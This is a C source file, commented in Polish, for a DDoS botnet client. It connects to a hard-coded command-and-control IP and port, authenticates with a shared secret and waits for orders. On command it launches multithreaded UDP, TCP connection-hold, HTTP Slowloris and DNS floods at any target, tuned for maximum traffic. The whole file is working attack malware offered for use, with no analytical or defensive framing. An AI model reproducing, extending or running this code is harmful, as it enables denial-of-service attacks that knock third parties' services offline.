#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <time.h>
#include <pthread.h> // Zakładam że masz pthreads-win32 dla Windows

#pragma comment(lib, "ws2_32.lib")

#define sleep(x) Sleep(1000 * (x))
#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0
#endif
#ifndef __linux__
#define close closesocket
#else
#include <sys/epoll.h>
#include <fcntl.h>
#include <unistd.h>
#endif

// Asynchroniczna Maszyna Stanow
typedef enum {
    SM_IDLE,
    SM_CONNECTING,
    SM_HTTP_WAIT,
    SM_HTTP_SENDING,
    SM_TCP_HOLD
} ConnState;

typedef struct {
    int sock;
    ConnState state;
    time_t last_action;
} SMConnection;
struct iphdr {
    unsigned int ihl:4;
    unsigned int version:4;
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct udphdr {
    uint16_t source;
    uint16_t dest;
    uint16_t len;
    uint16_t check;
};

// ==========================================
// KONFIGURACJA BOTA C2
// ==========================================
#define MASTER_IP "93.115.101.182"
#define MASTER_PORT 11290
#define NUM_THREADS 4  // Zoptymalizowane pod ilosc rdzeni, bez zabijania CPU przez Context Switching
volatile int stop_attack = 0;
time_t attack_end_time = 0;

typedef struct {
    char ip[64];
    int port;
    char method[16];
} AttackArgs;

// Helper by wymusić twardy reset gniazda i uniknąć TIME_WAIT, co zabija moc
void set_linger(int sock) {
    struct linger sl;
    sl.l_onoff = 1;
    sl.l_linger = 0;
    setsockopt(sock, SOL_SOCKET, SO_LINGER, (const char *)&sl, sizeof(sl));
}

void *udp_flood(void *arg) {
    AttackArgs *args = (AttackArgs *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    target.sin_addr.s_addr = inet_addr(args->ip);

    char payload[1400]; // Max UDP payload mniejsze niz MTU (zeby uniknac fragmentacji)
    for(int i = 0; i < 1400; i++) payload[i] = rand() % 255;

    while(time(NULL) < attack_end_time && !stop_attack) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        // Optymalizacja buffora dla max predkosci
        int bufsize = 1024 * 1024;
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (const char *)&bufsize, sizeof(bufsize));
        
        connect(sock, (struct sockaddr *)&target, sizeof(target));
        
        for(int i = 0; i < 2000; i++) {
            if(stop_attack) break;
            // Bezpieczny rozmiar omijajacy filtry fragmentacji (MTU 1500)
            int size = (rand() % 800) + 500; 
            send(sock, payload, size, MSG_NOSIGNAL);
        }
        close(sock);
    }
    return NULL;
}

void *tcp_flood(void *arg) {
    AttackArgs *args = (AttackArgs *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    target.sin_addr.s_addr = inet_addr(args->ip);

    int max_sockets = 1000;
    SMConnection *conns = malloc(sizeof(SMConnection) * max_sockets);
    for(int i = 0; i < max_sockets; i++) conns[i].state = SM_IDLE;

#ifdef __linux__
    // O(1) Epoll Event Loop dla maszyn Linuxowych (Produkcja VPS)
    int epoll_fd = epoll_create1(0);
    struct epoll_event ev, events[1000];
    
    while(time(NULL) < attack_end_time && !stop_attack) {
        for(int i = 0; i < max_sockets; i++) {
            if(conns[i].state == SM_IDLE) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                fcntl(sock, F_SETFL, O_NONBLOCK);
                connect(sock, (struct sockaddr *)&target, sizeof(target));
                conns[i].sock = sock;
                conns[i].state = SM_TCP_HOLD;
                ev.events = EPOLLOUT | EPOLLERR | EPOLLHUP;
                ev.data.ptr = &conns[i];
                epoll_ctl(epoll_fd, EPOLL_CTL_ADD, sock, &ev);
            }
        }
        
        int nfds = epoll_wait(epoll_fd, events, 1000, 10);
        for(int i=0; i<nfds; i++) {
            SMConnection *conn = (SMConnection *)events[i].data.ptr;
            if(events[i].events & (EPOLLERR | EPOLLHUP)) {
                close(conn->sock);
                conn->state = SM_IDLE;
            } else if (events[i].events & EPOLLOUT) {
                if(send(conn->sock, "\0", 1, MSG_NOSIGNAL) <= 0) {
                    close(conn->sock);
                    conn->state = SM_IDLE;
                }
            }
        }
    }
#else
    // O(N) Select Fallback dla srodowiska testowego Windows (MinGW)
    while(time(NULL) < attack_end_time && !stop_attack) {
        fd_set write_fds; FD_ZERO(&write_fds); int max_fd = 0;
        for(int i = 0; i < max_sockets; i++) {
            if(conns[i].state == SM_IDLE) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                u_long mode = 1; ioctlsocket(sock, FIONBIO, &mode);
                connect(sock, (struct sockaddr *)&target, sizeof(target));
                conns[i].sock = sock; conns[i].state = SM_TCP_HOLD;
            }
            if(conns[i].state == SM_TCP_HOLD) {
                FD_SET(conns[i].sock, &write_fds);
                if(conns[i].sock > max_fd) max_fd = conns[i].sock;
            }
        }
        struct timeval tv = {0, 10000};
        int activity = select(max_fd + 1, NULL, &write_fds, NULL, &tv);
        if(activity > 0) {
            for(int i = 0; i < max_sockets; i++) {
                if(conns[i].state == SM_TCP_HOLD && FD_ISSET(conns[i].sock, &write_fds)) {
                    if(send(conns[i].sock, "\0", 1, MSG_NOSIGNAL) <= 0) {
                        close(conns[i].sock); conns[i].state = SM_IDLE;
                    }
                }
            }
        }
    }
#endif
    for(int i = 0; i < max_sockets; i++) if(conns[i].state != SM_IDLE) close(conns[i].sock);
    free(conns);
    return NULL;
}

void *http_flood(void *arg) {
    AttackArgs *args = (AttackArgs *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    target.sin_addr.s_addr = inet_addr(args->ip);

    int max_sockets = 1000;
    SMConnection *conns = malloc(sizeof(SMConnection) * max_sockets);
    for(int i = 0; i < max_sockets; i++) conns[i].state = SM_IDLE;

    char request[512];
    snprintf(request, sizeof(request), 
             "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows)\r\nConnection: keep-alive\r\n", 
             args->ip);
    int req_len = strlen(request);

    // Asynchroniczna Maszyna Stanow HTTP Slowloris
#ifdef __linux__
    int epoll_fd = epoll_create1(0);
    struct epoll_event ev, events[1000];
    
    while(time(NULL) < attack_end_time && !stop_attack) {
        time_t now = time(NULL);
        for(int i = 0; i < max_sockets; i++) {
            if(conns[i].state == SM_IDLE) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                fcntl(sock, F_SETFL, O_NONBLOCK);
                connect(sock, (struct sockaddr *)&target, sizeof(target));
                conns[i].sock = sock;
                conns[i].state = SM_CONNECTING;
                ev.events = EPOLLOUT | EPOLLERR | EPOLLHUP;
                ev.data.ptr = &conns[i];
                epoll_ctl(epoll_fd, EPOLL_CTL_ADD, sock, &ev);
            } else if (conns[i].state == SM_HTTP_WAIT && (now - conns[i].last_action >= 1)) {
                conns[i].state = SM_HTTP_SENDING;
                ev.events = EPOLLOUT | EPOLLERR | EPOLLHUP;
                ev.data.ptr = &conns[i];
                epoll_ctl(epoll_fd, EPOLL_CTL_MOD, conns[i].sock, &ev);
            }
        }
        
        int nfds = epoll_wait(epoll_fd, events, 1000, 100);
        for(int i=0; i<nfds; i++) {
            SMConnection *conn = (SMConnection *)events[i].data.ptr;
            if(events[i].events & (EPOLLERR | EPOLLHUP)) {
                close(conn->sock); conn->state = SM_IDLE;
            } else if (events[i].events & EPOLLOUT) {
                if(conn->state == SM_CONNECTING) {
                    send(conn->sock, request, req_len, MSG_NOSIGNAL);
                    conn->state = SM_HTTP_WAIT;
                    conn->last_action = now;
                    ev.events = EPOLLERR | EPOLLHUP; // Czekamy na timeout, nie na gotowosc zapisu
                    ev.data.ptr = conn;
                    epoll_ctl(epoll_fd, EPOLL_CTL_MOD, conn->sock, &ev);
                } else if (conn->state == SM_HTTP_SENDING) {
                    char fake_header[64];
                    snprintf(fake_header, sizeof(fake_header), "X-a: %d\r\n", rand() % 10000);
                    if(send(conn->sock, fake_header, strlen(fake_header), MSG_NOSIGNAL) <= 0) {
                        close(conn->sock); conn->state = SM_IDLE;
                    } else {
                        conn->state = SM_HTTP_WAIT;
                        conn->last_action = now;
                        ev.events = EPOLLERR | EPOLLHUP;
                        ev.data.ptr = conn;
                        epoll_ctl(epoll_fd, EPOLL_CTL_MOD, conn->sock, &ev);
                    }
                }
            }
        }
    }
#else
    while(time(NULL) < attack_end_time && !stop_attack) {
        fd_set write_fds, read_fds; FD_ZERO(&write_fds); FD_ZERO(&read_fds);
        int max_fd = 0; time_t now = time(NULL);

        for(int i = 0; i < max_sockets; i++) {
            if(conns[i].state == SM_IDLE) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                u_long mode = 1; ioctlsocket(sock, FIONBIO, &mode);
                connect(sock, (struct sockaddr *)&target, sizeof(target));
                conns[i].sock = sock; conns[i].state = SM_CONNECTING;
            } else if (conns[i].state == SM_HTTP_WAIT && (now - conns[i].last_action >= 1)) {
                conns[i].state = SM_HTTP_SENDING;
            }
            
            if(conns[i].state == SM_CONNECTING || conns[i].state == SM_HTTP_SENDING) {
                FD_SET(conns[i].sock, &write_fds);
                if(conns[i].sock > max_fd) max_fd = conns[i].sock;
            }
            if(conns[i].state != SM_IDLE) {
                FD_SET(conns[i].sock, &read_fds); // Monitorujemy czy zerwano polaczenie
                if(conns[i].sock > max_fd) max_fd = conns[i].sock;
            }
        }

        struct timeval tv = {0, 100000}; 
        int activity = select(max_fd + 1, &read_fds, &write_fds, NULL, &tv);

        if(activity > 0) {
            for(int i = 0; i < max_sockets; i++) {
                if(conns[i].state != SM_IDLE && FD_ISSET(conns[i].sock, &read_fds)) {
                    char buf[1];
                    if(recv(conns[i].sock, buf, 1, 0) <= 0) { close(conns[i].sock); conns[i].state = SM_IDLE; continue; }
                }
                
                if(conns[i].state == SM_CONNECTING && FD_ISSET(conns[i].sock, &write_fds)) {
                    send(conns[i].sock, request, req_len, MSG_NOSIGNAL);
                    conns[i].state = SM_HTTP_WAIT;
                    conns[i].last_action = now;
                } else if(conns[i].state == SM_HTTP_SENDING && FD_ISSET(conns[i].sock, &write_fds)) {
                    char fake_header[64]; snprintf(fake_header, sizeof(fake_header), "X-a: %d\r\n", rand() % 10000);
                    if(send(conns[i].sock, fake_header, strlen(fake_header), MSG_NOSIGNAL) <= 0) {
                        close(conns[i].sock); conns[i].state = SM_IDLE;
                    } else {
                        conns[i].state = SM_HTTP_WAIT; conns[i].last_action = now;
                    }
                }
            }
        }
    }
#endif
    for(int i = 0; i < max_sockets; i++) if(conns[i].state != SM_IDLE) close(conns[i].sock);
    free(conns);
    return NULL;
}

void *dns_flood(void *arg) {
    AttackArgs *args = (AttackArgs *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    target.sin_addr.s_addr = inet_addr(args->ip);

    unsigned char dns_payload[] = {
        0x12, 0x34, // Transaction ID (bedzie losowane)
        0x01, 0x00, // Flags: Standard query
        0x00, 0x01, // Questions: 1
        0x00, 0x00, // Answer RRs: 0
        0x00, 0x00, // Authority RRs: 0
        0x00, 0x00, // Additional RRs: 0
        // Query: google.com
        0x06, 'g', 'o', 'o', 'g', 'l', 'e',
        0x03, 'c', 'o', 'm',
        0x00,
        0x00, 0x01, // Type: A
        0x00, 0x01  // Class: IN
    };

    while(time(NULL) < attack_end_time && !stop_attack) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        int bufsize = 1024 * 1024;
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (const char *)&bufsize, sizeof(bufsize));
        
        connect(sock, (struct sockaddr *)&target, sizeof(target));
        
        for(int i = 0; i < 2000; i++) {
            if(stop_attack) break;
            // Losujemy Transaction ID zeby ominac chache
            dns_payload[0] = rand() % 255;
            dns_payload[1] = rand() % 255;
            send(sock, dns_payload, sizeof(dns_payload), MSG_NOSIGNAL);
        }
        close(sock);
    }
    return NULL;
}

void start_attack(char *method, char *ip, int port, int duration) {
    if (!stop_attack && attack_end_time > time(NULL)) {
        stop_attack = 1;
        sleep(1); // Czekamy chwile az stare watki obumra
    }
    stop_attack = 0;
    attack_end_time = time(NULL) + duration;
    
    static AttackArgs args;
    strncpy(args.ip, ip, sizeof(args.ip));
    args.port = port;
    strncpy(args.method, method, sizeof(args.method));

    printf("[*] Rozpoczynam bezlitosny atak %s na %s:%d przez %d sekund (%d watkow)\n", method, ip, port, duration, NUM_THREADS);

    pthread_t threads[NUM_THREADS];
    for(int i = 0; i < NUM_THREADS; i++) {
        if(strcmp(method, "udp") == 0) {
            pthread_create(&threads[i], NULL, udp_flood, (void *)&args);
        } else if(strcmp(method, "tcp") == 0) {
            pthread_create(&threads[i], NULL, tcp_flood, (void *)&args);
        } else if(strcmp(method, "http") == 0) {
            pthread_create(&threads[i], NULL, http_flood, (void *)&args);
        } else if(strcmp(method, "dns") == 0) {
            pthread_create(&threads[i], NULL, dns_flood, (void *)&args);
        }
    }
    
    // Wątki działają w tle (detach), główny wątek wraca do nasłuchiwania Mastera
    for(int i = 0; i < NUM_THREADS; i++) {
        pthread_detach(threads[i]);
    }
}

int main() {
    int sock;
    struct sockaddr_in server;
    char buffer[1024];

    printf("======================================\n");
    printf("   [!] BOT (C) URUCHOMIONY NA VPS [!]\n");
    printf("   [!] WERSJA: NIEOGRANICZONA MOC [!]\n");
    printf("======================================\n");

    while(1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        server.sin_family = AF_INET;
        server.sin_port = htons(MASTER_PORT);
        server.sin_addr.s_addr = inet_addr(MASTER_IP);

        printf("[*] Szukam Mastera na %s:%d...\n", MASTER_IP, MASTER_PORT);

        if(connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
            sleep(5);
            close(sock);
            continue;
        }

        // Czekamy na "Podaj haslo:" lub prompt i wysyłamy autoryzację
        memset(buffer, 0, sizeof(buffer));
        recv(sock, buffer, sizeof(buffer), 0);
        send(sock, "bot_secret_xyz\n", 15, 0);
        
        printf("[+] Polaczono z C2. Czekam na krew...\n");

        while(1) {
            memset(buffer, 0, sizeof(buffer));
            int bytes_received = recv(sock, buffer, sizeof(buffer)-1, 0);
            
            if(bytes_received <= 0) {
                printf("[!] Rozlaczono z Masterem.\n");
                break;
            }

            // Usunięcie znaków nowej linii
            buffer[strcspn(buffer, "\r\n")] = 0;

            if(strcmp(buffer, "PING") == 0) continue;

            if(strcmp(buffer, "stop") == 0) {
                printf("[*] Otrzymano rozkaz przerwania ataku!\n");
                stop_attack = 1;
                continue;
            }

            // Analiza komendy: udp <ip> <port> <time>
            char method[16], ip[64];
            int port, duration;
            if(sscanf(buffer, "%15s %63s %d %d", method, ip, &port, &duration) == 4) {
                if(strcmp(method, "udp") == 0 || strcmp(method, "tcp") == 0 || strcmp(method, "http") == 0 || strcmp(method, "dns") == 0) {
                    start_attack(method, ip, port, duration);
                }
            }
        }
        close(sock);
        sleep(5);
    }
    return 0;
}
